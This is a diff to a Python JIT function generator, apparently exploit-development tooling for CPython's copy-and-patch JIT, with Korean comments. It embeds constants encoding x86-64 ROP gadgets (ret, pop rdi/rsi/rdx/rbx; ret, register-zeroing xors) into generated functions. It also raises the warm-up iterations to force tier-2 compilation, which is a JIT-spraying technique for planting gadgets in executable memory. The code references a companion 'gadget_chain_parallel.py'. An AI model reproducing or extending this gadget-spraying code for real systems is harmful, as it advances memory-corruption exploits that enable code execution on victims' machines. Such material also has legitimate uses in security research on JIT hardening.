@@ -127,29 +127,59 @@ class JITFunctionGenerator:
     
     def _create_jit_function(self, seed):
         """
-        단일 JIT 함수 생성
+        단일 JIT 함수 생성 (gadget_chain_parallel.py의 검증된 패턴 사용)
         
-        많은 연산을 포함하여 다양한 stencil 활용:
-        - BINARY_OP (add, mul, xor, shift)
+        다양한 stencil 활용:
+        - CALL (nested function)
+        - STORE_SUBSCR_DICT, LOAD_ATTR
         - COMPARE_OP
         - FOR_ITER
-        - STORE_SUBSCR
+        - BINARY_OP (add, mul, xor, shift)
         """
+        # MAGIC_VALUES from gadget_chain_parallel.py
+        magic_values = [
+            0x000000C3, 0x00005FC3, 0x00005EC3, 0x00005AC3,
+            0x00005BC3, 0x000031D2, 0x004831C0,
+        ]
+        magic_value = magic_values[seed % len(magic_values)]
+        
         code = f"""
 def jit_func_{seed}(x):
-    # 많은 연산으로 다양한 patch 패턴 생성
+    # Nested helper to trigger CALL-related stencils
+    def h(a, b):
+        return (a ^ b) & 0xFFFFFFFF
+
+    # Dictionary and object operations to trigger STORE_SUBSCR_DICT, LOAD_ATTR, COMPARE_OP stencils
+    d = {{}}
+    class Obj:
+        val = 0
+
+    obj = Obj()
     acc = x
-    for i in range({500 + seed * 10}):
-        acc = (acc + {seed}) & 0xFFFFFFFF
-        acc ^= (i << (i % 8))
+    for i in range({3000 + seed * 500}):
+        acc ^= ({magic_value} + (i << (i % 8)))
+        acc = ((acc << (i % 5)) | (acc >> (32 - (i % 5)))) & 0xFFFFFFFF
+        acc += ({magic_value} >> (i % 16))
         acc *= 3 + (i % 4)
-        acc = ((acc << 3) | (acc >> 29)) & 0xFFFFFFFF
-        acc += i * {seed % 100 + 1}
+        acc ^= (acc >> ((i+3) % 8))
+        acc ^= ({magic_value} + i) * ((acc >> 3) & 0xff)
+        acc += (i ^ {magic_value})
         
-        if i % 10 == 0:
-            acc ^= 0x12345678
-        if acc > 0x80000000:
-            acc -= 0x1000
+        # Trigger various stencils
+        acc = h(acc, i & 0xff)
+        
+        if i % 100 == 0:
+            d[i] = acc & 0xff
+            acc ^= d.get(i, 0)
+        
+        if i % 200 == 0:
+            obj.val = acc & 0xffff
+            acc += obj.val
+        
+        if acc > {magic_value}:
+            acc -= 1
+        elif acc < (i & 0xff):
+            acc += 1
     
     return acc
 """
@@ -157,8 +187,8 @@ def jit_func_{seed}(x):
         exec(code, scope)
         return scope[f'jit_func_{seed}']
     
-    def warmup(self, iterations=100):
-        """JIT 컴파일 유도 (warm-up)"""
+    def warmup(self, iterations=5000):
+        """JIT 컴파일 유도 (warm-up) - 더 많은 반복으로 tier 2 활성화"""
         start_time = time.time()
         print(f"[*] Warming up {len(self.functions)} functions ({iterations} iterations each)...")
         
